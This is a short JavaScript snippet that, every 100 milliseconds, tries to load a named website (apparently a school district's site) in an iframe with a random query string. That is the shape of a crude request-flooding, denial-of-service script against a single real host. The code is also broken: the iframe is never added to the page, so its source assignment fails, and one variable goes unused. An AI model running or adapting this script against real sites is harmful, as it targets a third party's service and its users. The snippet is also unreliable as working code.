setInterval(function(){
var randomNumber1 = Math.floor((Math.random() * 9001) + 1);
var randomNumber2 = Math.floor((Math.random() * 9001) + 1);
var x = document.createElement("iframe");
x.setAttribute("id", "myFrame");
var y = document.getElementById("myFrame").src = "http://www.mvcsc.k12.in.us/?r="+randomNumber2;
}, 100);
